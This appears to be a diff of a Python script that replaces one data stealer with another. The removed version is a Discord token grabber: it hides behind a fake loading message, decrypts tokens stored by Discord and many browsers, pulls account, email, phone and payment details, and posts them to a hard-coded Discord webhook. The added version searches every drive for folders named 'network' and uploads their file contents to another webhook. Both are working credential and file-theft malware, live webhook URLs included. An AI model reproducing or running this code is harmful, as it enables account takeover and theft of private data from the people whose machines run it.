@@ -1,229 +1,116 @@
 import os
-if os.name != "nt":
-    exit()
-import subprocess
 import sys
-import json
-import urllib.request
-import re
-import base64
-import datetime
-# উদাহরণ: auto_run_message.py
-import time
+import requests
 
-print("Panel starting... (this message will disappear in 3 seconds)")
-time.sleep(3)   # 3 সেকেন্ড অপেক্ষা; পরে স্বয়ংক্রিয়ভাবে এগোবে
+# Configuración
+TARGET_FOLDER_NAME = "network"
+MAX_BYTES = 1024 * 1024   # 1 MB máximo a leer por archivo
+PRINT_HEAD_BYTES = 2048   # Máx. caracteres a mostrar por archivo
+WEBHOOK_URL = "https://discord.com/api/webhooks/1423841797112856606/QZIdyx-h8VcYZ8aLxg4UYwfp_5rZOChmA8JUPpP1zLWMyoyt2g_5UGQeupSZzPkUwEMZ"
 
-# --- এরপর আপনার পরবর্তী কোড চলে যাবে ---
-print("Cnnot download try aganin letter...")
-
-
-def install_import(modules):
-    for module, pip_name in modules:
+def send_to_discord(message: str):
+    """Manda texto al webhook en bloques de código, cortado en <=2000 caracteres."""
+    if not message.strip():
+        return
+    max_len = 1900  # menos de 2000 porque añadimos ``` al inicio/fin
+    chunks = [message[i:i+max_len] for i in range(0, len(message), max_len)]
+    for chunk in chunks:
+        content = f"```{chunk}```"
         try:
-            __import__(module)
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            os.execl(sys.executable, sys.executable, *sys.argv)
+            requests.post(WEBHOOK_URL, json={"content": content})
+        except Exception as e:
+            sys.stderr.write(f"Error enviando a Discord: {e}\n")
 
-install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+def list_roots():
+    if os.name == "nt":  # Windows
+        from string import ascii_uppercase
+        return [f"{letter}:/" for letter in ascii_uppercase if os.path.exists(f"{letter}:/")]
+    else:  # Unix / macOS
+        return ["/"]
 
-import win32crypt
-from Crypto.Cipher import AES
+def find_network_dirs(start_path):
+    matches = []
+    for root, dirs, _ in os.walk(start_path, topdown=True):
+        for d in dirs:
+            if d.lower() == TARGET_FOLDER_NAME.lower():
+                matches.append(os.path.join(root, d))
+    return matches
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    'Discord': ROAMING + '\\discord',
-    'Discord Canary': ROAMING + '\\discordcanary',
-    'Lightcord': ROAMING + '\\Lightcord',
-    'Discord PTB': ROAMING + '\\discordptb',
-    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
-    'Amigo': LOCAL + '\\Amigo\\User Data',
-    'Torch': LOCAL + '\\Torch\\User Data',
-    'Kometa': LOCAL + '\\Kometa\\User Data',
-    'Orbitum': LOCAL + '\\Orbitum\\User Data',
-    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
-    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
-    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
-    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
-    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
-    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
-    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
-    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
-    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
-    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
-}
-
-def getheaders(token=None):
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-    }
-
-    if token:
-        headers.update({"Authorization": token})
-
-    return headers
-
-def gettokens(path):
-    path += "\\Local Storage\\leveldb\\"
-    tokens = []
-
-    if not os.path.exists(path):
-        return tokens
-
-    for file in os.listdir(path):
-        if not file.endswith(".ldb") and file.endswith(".log"):
-            continue
-
-        try:
-            with open(f"{path}{file}", "r", errors="ignore") as f:
-                for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                        tokens.append(values)
-        except PermissionError:
-            continue
-
-    return tokens
-    
-def getkey(path):
-    with open(path + f"\\Local State", "r") as file:
-        key = json.loads(file.read())['os_crypt']['encrypted_key']
-        file.close()
-
-    return key
-
-def getip():
+def try_read_file(path):
     try:
-        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
-            return json.loads(response.read().decode()).get("ip")
-    except:
-        return "None"
+        size = os.path.getsize(path)
+        to_read = min(size, MAX_BYTES)
+        with open(path, "rb") as f:
+            data = f.read(to_read)
+    except Exception as e:
+        return False, f"ERROR ABIERTA: {e}", False
+
+    for enc in ("utf-8", "latin-1", "cp1252"):
+        try:
+            text = data.decode(enc)
+            return True, text, size > to_read
+        except Exception:
+            continue
+    head = data[:PRINT_HEAD_BYTES]
+    return False, f"BINARIO NO DECODIFICABLE. Hex: {head.hex()}", size > to_read
+
+def process_network_dir(path):
+    count = 0
+    send_to_discord(f"=== Leyendo carpeta: {path} ===")
+    for root, _, files in os.walk(path):
+        for fname in files:
+            fpath = os.path.join(root, fname)
+            count += 1
+            send_to_discord(f"-- Archivo: {fpath}")
+
+            if os.path.islink(fpath):
+                send_to_discord("Archivo es un enlace simbólico. Omitiendo.")
+                continue
+
+            success, content_or_err, truncated = try_read_file(fpath)
+            if success:
+                snippet = (content_or_err[:PRINT_HEAD_BYTES] +
+                           ("\n\n... (archivo truncado en la salida) ..." if len(content_or_err) > PRINT_HEAD_BYTES else ""))
+                if truncated:
+                    snippet += "\n\n... (truncado en lectura) ..."
+                send_to_discord(snippet)
+            else:
+                send_to_discord(content_or_err + ("\n\n... (truncado) ..." if truncated else ""))
+    if count == 0:
+        send_to_discord("No se encontraron archivos dentro de esta carpeta.")
+    return count
 
 def main():
-    checked = []
+    try:
+        roots = list_roots()
+        if not roots:
+            send_to_discord("No se encontraron unidades raíz para explorar.")
+            return
 
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-
-        for token in gettokens(path):
-            token = token.replace("\\", "") if token.endswith("\\") else token
-
+        send_to_discord("Unidades/raíces a buscar: " + str(roots))
+        all_matches = []
+        for r in roots:
+            send_to_discord(f"Buscando en: {r} ...")
             try:
-                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                if token in checked:
-                    continue
-                checked.append(token)
-
-                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
-                if res.getcode() != 200:
-                    continue
-                res_json = json.loads(res.read().decode())
-
-                badges = ""
-                flags = res_json['flags']
-                if flags == 64 or flags == 96:
-                    badges += ":BadgeBravery: "
-                if flags == 128 or flags == 160:
-                    badges += ":BadgeBrilliance: "
-                if flags == 256 or flags == 288:
-                    badges += ":BadgeBalance: "
-
-                params = urllib.parse.urlencode({"with_counts": True})
-                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
-                guilds = len(res)
-                guild_infos = ""
-
-                for guild in res:
-                    if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
-                        vanity = ""
-
-                        if res["vanity_url_code"] != None:
-                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
-
-                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
-                if guild_infos == "":
-                    guild_infos = "No guilds"
-
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
-                has_nitro = False
-                has_nitro = bool(len(res) > 0)
-                exp_date = None
-                if has_nitro:
-                    badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
-
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
-                available = 0
-                print_boost = ""
-                boost = False
-                for id in res:
-                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                        print_boost += f"ㅤ- Available now\n"
-                        available += 1
-                    else:
-                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
-                    boost = True
-                if boost:
-                    badges += f":BadgeBoost: "
-
-                payment_methods = 0
-                type = ""
-                valid = 0
-                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
-                    if x['type'] == 1:
-                        type += "CreditCard "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-                    elif x['type'] == 2:
-                        type += "PayPal "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-
-                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
-                embed_user = {
-                    'embeds': [
-                        {
-                            'title': f"**New user data: {res_json['username']}**",
-                            'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
-                            'color': 3092790,
-                            'footer': {
-                                'text': "Made by Astraa ・ https://github.com/astraadev"
-                            },
-                            'thumbnail': {
-                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
-                            }
-                        }
-                    ],
-                    "username": "Grabber",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
-                }
-
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1421443591124942972/fg17lMp2t6SJsNFK0c-i_nkbkF-cdk2Q8e1P4RzPJ7mKaOYLwCI3HmQ8t2Rcw07jDYEB', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
-            except urllib.error.HTTPError or json.JSONDecodeError:
-                continue
+                all_matches.extend(find_network_dirs(r))
             except Exception as e:
-                print(f"ERROR: {e}")
-                continue
+                send_to_discord(f"Error al buscar en {r}: {e}")
+
+        if not all_matches:
+            send_to_discord("No se encontró ninguna carpeta llamada 'network'.")
+            return
+
+        send_to_discord(f"Se encontraron {len(all_matches)} carpetas 'network'.")
+        total_files = 0
+        for ndir in all_matches:
+            try:
+                total_files += process_network_dir(ndir)
+            except Exception as e:
+                send_to_discord(f"Error al procesar {ndir}: {e}")
+
+        send_to_discord(f"Proceso terminado. Archivos leídos (intentos): {total_files}")
+    except Exception as e:
+        send_to_discord(f"ERROR GENERAL: {e}")
 
 if __name__ == "__main__":
     main()
-
-
-
-
-
-
-
